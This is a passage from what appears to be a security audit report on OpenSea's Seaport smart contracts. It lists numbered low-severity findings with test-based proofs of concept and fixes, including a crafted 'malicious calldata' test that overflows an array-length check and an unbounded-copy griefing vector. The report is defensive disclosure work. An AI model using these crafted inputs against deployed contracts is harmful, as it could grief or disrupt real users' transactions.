is the offset). The offset has info length `7` followed by \"Seaport\" (`0x536561706f7274` but padded with zeros on the right).\n\nProperly encoded data would look like this:\n```\n0000000000000000000000000000000000000000000000000000000000000020\n0000000000000000000000000000000000000000000000000000000000000007\n536561706f727400000000000000000000000000000000000000000000000000\n```\n\nThe final `mstore(0x27, ...)` only writes to memory regions `[0x29, 0x49)`. The remainder will likely contain junk. You can expect the actual data to be:\n```\n0000000000000000000000000000000000000000000000000000000000000020\n0000000000000000000000000000000000000000000000000000000000000007\n536561706f72740?????????????????????????????????????????????????\n```\n\n\n\nBecause `0x40` points to the free memory pointer, you can expect the value `mload(0x40)` to be a relatively small number. So only the last few least significant bits would be set, with the rest to be `0` in usual cases. \n\n\n### Proof of Concept\n```diff\nmodified   test/foundry/FulfillBasicOrderTest.sol\n@@ -32,6 +32,25 @@ contract FulfillBasicOrderTest is BaseOrderTest {\n         uint128 tokenAmount;\n     }\n \n+    function testName() public {\n+        string memory name = consideration.name();\n+        uint rds;\n+        uint a;\n+        uint b;\n+        bytes32 c;\n+        assembly {\n+            rds := returndatasize()\n+            returndatacopy(mload(0x40), 0, returndatasize())\n+            a := mload(mload(0x40))\n+            b := mload(add(mload(0x40), 32))\n+            c := mload(add(mload(0x40), 64))\n+        }\n+        emit log_named_uint(\"returndatasize: \", rds);\n+        emit log_named_uint(\"offset: \", a);\n+        emit log_named_uint(\"length: \", b);\n+        emit log_named_bytes32(\"data: \", c);\n+    }\n+\n```\n\nreturns:\n```\n  returndatasize: : 96\n  offset: : 32\n  length: : 13\n  data: : 0x436f6e73696465726174696f6e00000000000000000000000000000000000080\n```\n\nThe final `80` character is the initial value of the free memory pointer!\n\n### Recommended Mitigation Steps\n\nClean the last word properly. This requires an additional `mstore`.\n\n#### HEVM confirmation\n\nhevm confirms this.<br>\nFile 1:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.13;\n\ncontract Seaport {\n\tfunction f() public pure returns (string memory) {\n\t\treturn _name();\n\t}\n\n    function _name() internal pure returns (string memory) {\n        // Return the name of the contract.\n        assembly {\n            mstore(0, 0x20)\n            mstore(0x27, 0x07536561706f7274)\n            return(0, 0x60)\n        }\n    }\n}\n```\n\nFile 2:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.13;\n\ncontract Seaport {\n\tfunction f() public pure returns (string memory) {\n\t\treturn _nameString();\n\t}\n\n    function _nameString() internal pure returns (string memory) {\n        // Return the name of the contract.\n        return \"Seaport\";\n    }\n}\n```\n\nRun:\n```\nhevm equivalence --code-a $(cat seaport1.bin) --code-b $(cat seaport2.bin)\nNot equal!\nCounterexample:\nCalldata:\n0x26121ff0000000000000000000000000000000\nCaller:\n0x0000000000000000000000000000000000000000\nCallvalue:\n0\n```\n\nAdding `mstore(0x49, 0x00)` before the return in the first version makes it work:\n\n```\nhevm equivalence --code-a $(cat seaport1.bin) --code-b $(cat seaport2.bin)\nExplored: 4 execution paths of A and: 4 paths of B.\nNo discrepancies found.\n```\n\n## [02] `_revertWithReasonIfOneIsReturned`, `_doesNotMatchMagic` (and `_assertIsValidOrderStaticcallSuccess`) have a fragile dependency on call order\n\nThese helper functions rely on the undisturbed contents returned by `returndatasize`/`returndatacopy`. Should the call sites undergo some changes, they may not function as intended. They are used in numerous functions.\n\nThis is further complicated in `_assertIsValidOrderStaticcallSuccess` which is another layer hiding this assumption.\n\n### Proof of Concept\n**Context:** [LowLevelHelpers.sol#L46](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/LowLevelHelpers.sol#L46), [LowLevelHelpers.sol#L103](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/LowLevelHelpers.sol#L103), [ZoneInteraction.sol#L157](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/ZoneInteraction.sol#L157)\n\nIssues can arise if:\n1. The order of these helpers change and some other call is performed\n2. These helpers become non-internal library functions (because then a call is performed and in the new context the buffer is empty)\n\nAn example use case is below:\n```solidity\n        assembly {\n            // Transfer the ETH and store if it succeeded or not.\n            success := call(gas(), to, amount, 0, 0, 0, 0)\n        }\n\n       // <-- Do something here to disturb the returndata buffer\n\n        // If the call fails...\n        if (!success) {\n            // Revert and pass the revert reason along if one was returned.\n            _revertWithReasonIfOneIsReturned();\n\n            // Otherwise, revert with a generic error message.\n            revert EtherTransferGenericFailure(to, amount);\n        }\n```\n\nSimple way to make this fail:\n```diff\n-    function _revertWithReasonIfOneIsReturned() internal view {\n+    function _revertWithReasonIfOneIsReturned() view {\n```\n\n### Recommended Mitigation Steps\n\nDocument these assumptions as a warning and carefully test these cases.\n\n## [03] `_performERC1155BatchTransfers` consumes all gas on invalid input\n\nThe `_performERC1155BatchTransfers` function manually ABI decodes `ConduitBatch1155Transfer[]`. While doing so it will read field, without any validation, to determine the length of expected data and subsequently execute `calldatacopy` with potentially unbounded copying.\n\nThis may be used as a griefing attack, and such attacks seem to be attempted to be avoided by the project, as evidenced by the logic in `_revertWithReasonIfOneIsReturned`.\n\nThis function is only used in the conduit and is exposed under the `executeBatch1155` external function. The risk depends on how this will be used in the future.\n\n### Proof of Concept\n**Context:** [TokenTransferrer.sol#L524](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L524), [TokenTransferrer.sol#L530](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L530), [TokenTransferrer.sol#L557](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L557)\n\n### Recommended Mitigation Steps\n\nValidate lengths against `calldatasize()`.\n\n## [04] Hardcoded values in `_validateAndFulfillBasicOrder()`\n\nThe distance between fields in structs is hardcoded. This could lead to mistakes with future maintenance of the code.\nThis distance can also be calculated.\n\n### Proof of Concept\n**Context:** [BasicOrderFulfiller.sol#L118-L128](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L118-L128)\n\nThe function `_validateAndFulfillBasicOrder()` has a hardcoded value of `FiveWords` to calculate the distance between the location of \n`considerationToken` and the `offerToken` in the `struct` `BasicOrderParameters`.\n\n```solidity\nfunction _validateAndFulfillBasicOrder(\n    ...\n    assembly {\n            // Determine if offered item type == additional recipient item type.\n            let offerTypeIsAdditionalRecipientsType := gt(route, 3)\n\n            // If route > 3 additionalRecipientsToken is at 0xc4 else 0x24.\n            additionalRecipientsToken := calldataload(\n                add(\n                    BasicOrder_considerationToken_cdPtr,\n                    mul(offerTypeIsAdditionalRecipientsType, FiveWords) // FiveWords is the hardcoded distance\n                )\n            )\n   ...\n}   \n\nstruct BasicOrderParameters {\n    address considerationToken; \n    uint256 considerationIdentifier; \n    uint256 considerationAmount; \n    address payable offerer; \n    address zone; \n    address offerToken; \n  ...\n}\n```\n\n### Recommended Mitigation Steps\nCalculate the distance between `considerationToken` and the `offerToken` and use that instead of `FiveWords`:\n\n```diff\nuint256 constant BasicOrder_considerationToken_cdPtr = 0x24;\nuint256 constant BasicOrder_offerToken_cdPtr = 0xc4;         \n\n+uint256 constant BasicOrder_Distance_oc_cdPtr = BasicOrder_offerToken_cdPtr - BasicOrder_considerationToken_cdPtr;\n\n- mul(offerTypeIsAdditionalRecipientsType, FiveWords)\n+ mul(offerTypeIsAdditionalRecipientsType, BasicOrder_Distance_oc_cdPtr) \n```\n\nNote: this suggestion could also be used for the assignment of `conduitKey`.\nSee [BasicOrderFulfiller.sol#L165-L170](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L165-L170) and [BasicOrderFulfiller.sol#L1026-L1033](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L1026-L1033)\n\n## [05] Helpers should have their expectations explained in NatSpec/comments\n\nCertain functions with `unchecked` blocks or other \"exotic logic\" have assumptions for certain input values. These assumptions are not documented well. It makes it error prone to validate against possible inputs and/or expected behaviour.\n\nExamples:\n\n1. is `_locateCurrentAmount`/`_applyFraction` which has a strong dependency on `duration != 0` and `startTime < endTime` (and `!=`). There are other cases too.\n2. In [AmountDeriver.sol#L13](https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/AmountDeriver.sol#L13). The correct word is \"interpolation\", not  \"extrapolation\". Similarly at other places where the word is used.\n3. In [AmountDeriver.sol#L114](https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/AmountDeriver.sol#L114), there are assumptions about the range of amounts supported in the protocol. This need to be documented well. Protocols such as Uniswap makes such assumptions explicit. More specifically, there are overflow issues when `value >= type(uint).max / type(uint120).max` Around `2**136`. \n\n## Proof of Concept\n**Context:** [lib/AmountDeriver.sol#L33](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L33), [lib/AmountDeriver.sol#L138](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L138)\n\n### Recommended Mitigation Steps\n\nDocument these assumptions.\n\n## [06] `ConduitTransfer` identifier field can be dirty and unused\n\nThere are two external entry points `execute(ConduitBatch1155Transfer[] calldata batchTransfers)` and `executeWithBatch1155(ConduitTransfer[] calldata standardTransfers, ConduitBatch1155Transfer[] calldata batchTransfers)` which trigger the internal [`_transfer(...)`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L174) function. It works off this data structure:\n```solidity\nstruct ConduitTransfer {\n    ConduitItemType itemType;\n    address token;\n    address from;\n    address to;\n    uint256 identifier;\n    uint256 amount;\n}\n```\n\nThe `_transfer` function only supports the ERC-20/ERC-721/ERC-1155 item types, where it ensures that `amount == 1` for ERC-721, but allows `identifier` to be anything for ERC-20 transfers.\n\nIt could be:\n1) used to create multiple transactions which have identical outcomes (since the field is ignored)\n2) misused to masquerade an ERC-20 transfer to look more similar to an ERC-721 transfer.\n\nThis problem is similar to the `SpentItem/ReceivedItem fields can be dirty and unused` issue and can be triggered through that transaction, but since the `Conduit` is a general purpose feature and could be used and triggered by other contracts too.\n\nWe believe that can have severe risks in the future. But it is hard to argue about the severity of this currently due to lack of clarity on what kinds of applications would be built on top of conduits.\n\n### Proof of Concept\n**Context:** [Conduit.sol#L174](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L174), [Conduit.sol#L52](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L52), [Conduit.sol#L117](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/conduit/Conduit.sol#L117)\n\n### Recommended Mitigation Steps\n\nInsert check that `item.identifier == 0` for `ConduitItemType.ERC20`.\n\n## [07] Inconsistent way to return values in `_verifyTime()` and `_verifyOrderStatus`\n\nThe functions `_verifyTime()` and `_verifyOrderStatus` use two different ways to return a value. For consistency its better to use the same way every time.\n\n### Proof of Concept\n**Context:** [Verifiers.sol#L37-L55](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Verifiers.sol#L37-L55), [Verifiers.sol#L102-L139](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Verifiers.sol#L102-L139)\n\n```solidity\nfunction _verifyTime( ... ) internal view returns (bool valid) {\n    ...\n    if ( ... ) { \n        ...\n        // Return false as the order is invalid.\n        return false; // method 1\n    }\n    // Return true as the order time is valid.\n    valid = true; // method 2\n}\n```\n```solidity\nfunction _verifyOrderStatus( ... ) internal pure returns (bool valid) {\n    ...\n    if ( ... ) {\n        // Return false as the order status is invalid.\n        return false; // method 1\n    }\n    // Return true as the order status is valid.\n    valid = true; // method 1\n}\n```\n\n### Recommended Mitigation Steps\nConsider changing the code in the functions `_verifyTime()` and `_verifyOrderStatus` in the following way:\n```diff\n- valid = true;\n+ return true;\n```\n\n## [08] `_callConduitUsingOffsets` depends on compiler behaviour for inter-assembly-block cleanup\n\nThe function `_callConduitUsingOffsets` depends on the compiler not to use the scratch space between assembly blocks. it also performs some Solidity function calls between the two blocks.\n\nA compiler behaviour change would render calling conduits always failing.\n\nFurthermore this function depends on `_revertWithReasonIfOneIsReturned` not disturbing anything (see another relevant issue by us).\n\n### Proof of Concept\n**Context:** [Executor.sol#L498](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L498)\n\n```solidity\n        bool success;\n\n        // call the conduit.\n        assembly {\n            // Ensure first word of scratch space is empty.\n            mstore(0, 0)\n\n            // Perform call, placing first word of return data in scratch space.\n            success := call(\n                gas(),\n                conduit,\n                0,\n                callDataOffset,\n                callDataSize,\n                0,\n                OneWord\n            )\n        }\n\n        // <--- If the compiler changes scratch space after this (or even in the helpers below) then it will fail.\n\n        // If the call failed...\n        if (!success) {\n            // Pass along whatever revert reason was given by the conduit.\n            _revertWithReasonIfOneIsReturned();\n\n            // Otherwise, revert with a generic error.\n            revert InvalidCallToConduit(conduit);\n        }\n\n        // Ensure that the conduit returned the correct magic value.\n        bytes4 result;\n        assembly {\n            // Take value from scratch space and place it on the stack.\n            result := mload(0)\n        }\n\n        // Ensure result was extracted and matches EIP-1271 magic value.\n        if (result != ConduitInterface.execute.selector) {\n            revert InvalidConduit(conduitKey, conduit);\n        }\n```\n\n### Recommended Mitigation Steps\n\n1. Load the scratch space in the first assembly block\n2. Since this function seems to perform \"return-magic-detection\", one could consider replacing most of this with `_doesNotMatchMagic`\n\n## [09] `Assertions.sol` is missing an assertion about bounds for array length\n\n**Context:** [Assertions.sol#L129-L144](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/Assertions.sol#L129-L144)\n\nSo far, the impact seems low and we are not able to craft an exploit.\n\n```solidity\nvalidOffsets := and(\n    validOffsets,\n    eq(\n        // Load signature offset from calldata 0x244.\n        calldataload(BasicOrder_signature_cdPtr),\n        // Derive expected offset as start of recipients + len * 64.\n        add(\n            BasicOrder_signature_ptr,\n            mul(\n                // Additional recipients length at calldata 0x264.\n                calldataload(\n                    BasicOrder_additionalRecipients_length_cdPtr\n                ),\n                // Each additional recipient has a length of 0x40.\n                AdditionalRecipients_size\n            )\n        )\n    )\n```\n\nThe above code checks for the following, let `len` represent the length of the `additionalRecipients` array, then it checks that `len * 64 + 0x260 == calldataload(0x244)`. Where all the arithmetic is in EVM. This however does not check for overflow of `len * 64`. It's possible to craft malicious calldata that would satisfy this condition by overflowing on the multiplication.\nWe need to find `x` such that `mul(x, 64) = mul(len, 64)` in EVM arithmetic. The values of `x` can be `len + y` where `y` is in the set `{2**250, 2**251, ..., 2**255}`. These are also the only such values.\n\nThis would create problems whenever the value `BasicOrder_additionalRecipients_length_cdPtr` is used to do read from calldata.\n\nNote: the solidity compiler would add the check `len < 2**64` for high level data.\nNote: the issues is similar to some known bugs in past versions of solc. Look for bug descriptions with \"overflow\" in [bugs.json](https://github.com/ethereum/solidity/blob/develop/docs/bugs.json).\n\n### Proof of Concept\n\nThe following addition to the test would revert, but the reverts happen later in the codebase, likely due to OOG as the value gets used in a for-loop in [BasicOrderFulfiller.sol#L611-L13](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/BasicOrderFulfiller.sol#L611-L13).\n\nThe test changes the length of an empty array to `2**255`, everything else in the `calldata` remaining the same. The invariant `0 * 64 + 0x260 == 0x260 == 2**255 * 64 + 0x60` is true in EVM arithmetic.\n\n```diff\nmodified   test/index.js\n@@ -15945,6 +15945,25 @@ describe(`Consideration (version: ${VERSION}) — initial test suite`, function\n         ).to.be.revertedWith(\"InvalidBasicOrderParameterEncoding\");\n       });\n \n+      it(\"Malicious calldata\", async () => {\n+        console.log(`Good data: ${calldata}`)\n+        console.log(`calldata[0x284:0x2a4]: ${calldata.slice(2 * 0x284 + 2, 2 * 0x2a4 + 2)}`)\n+        const badData = [calldata.slice(0, 2 * 0x284 + 2), \"f000000000000000000000000000000000000000000000000000000000000000\", calldata.slice(2 * 0x2a4 + 2)].join(\n+          \"\"\n+        );\n+        console.log(`Bad data: ${badData}`)\n+        expect(badData.length).to.eq(calldata.length);\n+\n+        await expect(\n+          buyer.sendTransaction({\n+            to: marketplaceContract.address,\n+            data: badData,\n+            value,\n+          })\n+        ).to.be.revertedWith(\"InvalidBasicOrderParameterEncoding\");\n+      });\n+\n       it(\"Reverts if additionalRecipients has non-default offset\", async () => {\n         const badData = [\n```\n\n### Recommended Mitigation Steps\n\nConsider adding a check for `calldataload(BasicOrder_additionalRecipients_length_cdPtr) < 2**64`, similar to what `solc` generates. Alternatively, the number `2**64` can be decreased further, depending on a realistic upper bound for `additionalRecipients`.\n\n## [10] LowLevelHelpers enforce a stricter ABI standard for `returndatasize`\n\n**Context**: [LowLevelHelpers.sol#L110](https://github.com/ProjectOpenSea/seaport/blob/878121af65be408462f3eae04ab81018b4e199da/contracts/lib/LowLevelHelpers.sol#L110)\n\n```solidity\n        assembly {\n            // Only put result on stack if return data is exactly one word.\n            if eq(returndatasize(), OneWord) {\n```\n\nThis is not compliant with the ABI standard, as the ABI standard allows for returning more data than needed. The proper one should `if iszero(lt(returndatasize(), OneWord))`.\n\nThis is currently used in \n1. `_assertValidEIP1271Signature`: to check the returnvalue `bytes4 magicValue` of `isValidSignature`.\n2. ` _assertIsValidOrderStaticcallSuccess` for checking `ZoneInterface` returnvalue.\n\nThe ABI standard allows for extra data everywhere. That is, given a correct 32-byte value, having more data at the end is valid. Therefore, this function returns `false` for complaint contracts.\n\nHowever, most contracts wouldn't return more than 32-bytes when only 32-bytes are needed. A notable exception is some versions of proxy contracts in Vyper. This proxy always returned 128 bytes, with any extra data padded with zeros ([source](https://github.com/vyperlang/vyper/blob/069936fa3fee8646ff362145593128d7ef07da38/vyper/functions/functions.py#L1471)). This has caused issues with SolMate's `SafeTransferLib`, leading to DOS issues on chain ([source](https://github.com/Rari-Capital/solmate/issues/141)).\n\nThis is at least a low severity issue, and may even be considered Medium if there are known EIP1271 wallets in existence with the aforementioned issue. Note: for ERC20 tokens, there are known tokens with the problem (certain Curve tokens). Considering that this is a trivial fix, it's better to be on the side of caution and make the above change.\n\n### Proof of Concept\n\nFor a simple proof of concept, consider a minimal proxy contract that does `return(0, 0x1000)` (instead of the usual `return(0, returndatasize())`) where the 'implementation' is a EIP1271 wallet contract. The low level helper would revert when verifying the `_assertValidEIP1271Signature`, whereas a high level solidity implementation would succeed.\n\n### Recommended Mitigation Steps\n\nChange the strict equality check to a `>=` check.\n\n## [11] `_assertValidSignature` allows malleable `secp256k1` signatures\n\nThe `ecrecover()` call [here](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/SignatureVerification.sol#L91) does not verify `0 < s < secp256k1.n ÷ 2 + 1`.\n\nThis restriction was introduced Homestead ([EIP-2](https://eips.ethereum.org/EIPS/eip-2)), but left the precompile unchanged. Most libraries, such as OpenZeppelin, [perform this check](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.6.0/contracts/utils/cryptography/ECDSA.sol#L152-L166).\n\nThere does not seem to be an immediate risk in the current use cases, because an order can be verified only once and its hash is stored. These places are [`_validateBasicOrderAndUpdateStatus`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L48), [`_validateOrderAndUpdateStatus`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L104) and [`validate`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L333).\n\n### Proof of Concept\n**Context:** [SignatureVerification.sol#L91](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/SignatureVerification.sol#L91)\n\n### Recommended Mitigation Steps\n\nPerform the check.\n\n## [12] The memory cost calculation logic `_revertWithReasonIfOneIsReturned` is duplicated in multiple places\n\n`_revertWithReasonIfOneIsReturned` implements a memory cost calculation logic. This is duplicated in four places: `_performERC20Transfer`, `_performERC721Transfer`, `_performERC1155Transfer`, `_performERC1155BatchTransfer`.\n\nSeveral slight issues were identified with this function and those may or may not be present in five places in total.\n\n### Proof of Concept\n**Context:** [LowLevelHelper.sol#L46](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/LowLevelHelpers.sol#L46), [TokenTransferrer.sol#L79](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L79), [TokenTransferrer.sol#L259](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L259), [TokenTransferrer.sol#L393](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L393), [TokenTransferrer.sol#L639](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/TokenTransferrer.sol#L639)\n\n### Recommended Mitigation Steps\n\nReduce code duplication and risk of differences between them.\n\n## [13] Accumulator code depends on memory usage\n\nThe accumulator is used in [`BasicOrderFulfiller`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L196), [`OrderFulfiller`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderFulfiller.sol#L175) and [`OrderCombiner`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderCombiner.sol#L618). It is a variable length array, but does not have a properly allocated memory space. It can be grown using [`_insert`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L588) and [`_trigger`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L456) will \"flush\" it.\n\nThe problem is it is placed at the free memory pointer, but the pointer is not increment if it would grow beyond its initial capacity. The initial capacity is `AccumulatorDisarmed` aka 32. In the use cases it seems at most 2 entries are inserted.\n\nInstead of relying that this memory space is never overwritten, it may make sense pre-allocating a fixed structure. The current implementation can break on compiler upgrades or changes in the function layouts.\n\n### Proof of Concept\n**Context:** [`BasicOrderFulfiller`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L196), [`OrderFulfiller`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderFulfiller.sol#L175), [`OrderCombiner`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderCombiner.sol#L618), [`_insert`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L588), [`_trigger`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Executor.sol#L456)\n\n### Recommended Mitigation Steps\n\nAvoid using the non-memory allocating accumulator design.\n\n## [14] Doing a basic order twice gives a misleading error message\n\nWhen doing a basic order twice a misleading error message is given: `OrderPartiallyFilled()`.\n\n### Proof of Concept\n**Context:**  [OrderValidator.sol#L48-L74](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/OrderValidator.sol#L48-L74), [Verifiers.sol#L102-L139](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/Verifiers.sol#L102-L139)\n\nWhen doing a basic order, the function `_validateBasicOrderAndUpdateStatus()` is called, which uses `_verifyOrderStatus()` to verify the order hasn't been used before. After this function it sets `_orderStatus[orderHash].numerator = 1;` to indicate the `orderHash` has been used.\nWhen trying to reuse the same order, `_verifyOrderStatus()` correctly `revert`s. However it uses the `revert` message `OrderPartiallyFilled()` which is not correct because the order has been fully filled before.\n\n```solidity\ncontract OrderValidator is Executor, ZoneInteraction {\n    function _validateBasicOrderAndUpdateStatus( ... ) ... {\n        ...\n        _verifyOrderStatus(\n            orderHash,\n            orderStatus,\n            true, // Only allow unused orders when fulfilling basic orders.\n            true // Signifies to revert if the order is invalid.\n        );\n     ...\n    _orderStatus[orderHash].numerator = 1;\n    ...\n    }\n}\n```\n```solidity\ncontract Verifiers is Assertions, SignatureVerification {\n    function _verifyOrderStatus(..., bool onlyAllowUnused, ... ) ... {\n        ...      \n        if (orderStatus.numerator != 0) {  // the second time numerator == 1\n            if (onlyAllowUnused) {   // true\n                revert OrderPartiallyFilled(orderHash);  // misleading message\n                ...\n            }\n        }\n    }\n} \n revert OrderPartiallyFilled(orderHash);\n```\n\n### Recommended Mitigation Steps\nConsider giving a different error message in `_verifyOrderStatus()` when a basic order is executed twice.\n\n## [15] Orders with moving price and `endTime = type(uint).max` can never be fulfilled\n\nIt is quite realistic that many users will use `type(uint).max` as `infinity` when setting the `endTime` of their orders so that it stays open indefinitely. However the math `(startAmount * remaining) + (endAmount * elapsed) + extraCeiling` in https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/AmountDeriver.sol#L57 will almost always revert in that case since `remaining` will be very large and this block of code is checked Solidity.\n\n### Proof of Concept\n**Context:** [Seaport.sol](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/Seaport.sol)\n\nUse the new test below and run `forge test -m testAdvancedPartialMaxEndTime -vvvv`:\n\n```solidity\nfunction testAdvancedPartialMaxEndTime() public {\n\tFuzzInputs memory inputs = FuzzInputs(\n\t\t0,\n\t\taddress(0),\n\t\tbytes32(0),\n\t\t0,\n\t\t0,\n\t\t[uint120(10), 20, 30],\n\t\tfalse,\n\t\t1,\n\t\t1\n\t);\n\n\t_testAdvancedPartialMaxEndTime(\n\t\tContext(consideration, inputs, 10, 10)\n\t);\n}\n\nfunction _testAdvancedPartialMaxEndTime(\n\tContext memory context\n) internal resetTokenBalancesBetweenRuns {\n\tbytes32 conduitKey = context.args.useConduit\n\t\t? conduitKeyOne\n\t\t: bytes32(0);\n\n\tuint startAmount = 10;\n\tuint endAmount = 20;\n\n\ttest1155_1.mint(\n\t\talice,\n\t\tcontext.args.tokenId,\n\t\tendAmount\n\t);\n\n\t_configureOfferItem(\n\t\tItemType.ERC1155,\n\t\tcontext.args.tokenId,\n\t\tstartAmount,\n\t\tendAmount\n\t);\n\t_configureEthConsiderationItem(\n\t\talice,\n\t\t10\n\t);\n\n\tOrderParameters memory orderParameters = OrderParameters(\n\t\taddress(alice),\n\t\tcontext.args.zone,\n\t\tofferItems,\n\t\tconsiderationItems,\n\t\tOrderType.PARTIAL_OPEN,\n\t\tblock.timestamp, // startTime\n\t\ttype(uint).max, // endTime\n\t\tcontext.args.zoneHash,\n\t\tcontext.args.salt,\n\t\tconduitKey,\n\t\tconsiderationItems.length\n\t);\n\n\tOrderComponents memory orderComponents = getOrderComponents(\n\t\torderParameters,\n\t\tcontext.consideration.getNonce(alice)\n\t);\n\n\tbytes32 orderHash = context.consideration.getOrderHash(orderComponents);\n\n\tbytes memory signature = signOrder(\n\t\tcontext.consideration,\n\t\talicePk,\n\t\torderHash\n\t);\n\n\tdelete offerItems;\n\tdelete considerationItems;\n\n\tAdvancedOrder memory advancedOrder = AdvancedOrder(\n\t\torderParameters,\n\t\t1,\n\t\t1,\n\t\tsignature,\n\t\t\"\"\n\t);\n\n\tcontext.consideration.fulfillAdvancedOrder{\n\t\tvalue: 10\n\t}(advancedOrder, new CriteriaResolver[](0), bytes32(0));\n\t(, , uint256 totalFilled, uint256 totalSize) = context\n\t\t.consideration\n\t\t.getOrderStatus(orderHash);\n}\n```\n\n### Recommended Mitigation Steps\n\nNeed to find a way to compute the linear interpolation without overflows.\nFor `(a + b) / 2`, the trick is `a / 2 + b / 2 + (a & b & 1)`:\nhttps://devblogs.microsoft.com/oldnewthing/20220207-00/?p=106223\n\nNeed to find a similar trick for `(x * a + y * b) / (x + y)`.\n\nWorst case it can also be a front end fix.\n\n## [16] `_prepareBasicFulfillmentFromCalldata` overwrites memory extensively\n\nThe `_prepareBasicFulfillmentFromCalldata` function prepares ABI encoded data at fixed location in memory (starting at `0x80` and writing as high as `0x1e0+0x20`).\n\nThe overwritten memory does not seem to be saved, and this function has multiple assembly blocks (probably for avoiding `stack too deep errors`?). The only field restored is the zero slot.\n\nThe only use in Seaport is the `Consideration.fulfillBasicOrder` → `_validateAndFulfillBasicOrder` → `_prepareBasicFulfillmentFromCalldata` call chain, where this does not seem to be a problem, because they are not allocating memory prior to entering this function (according to displaying the 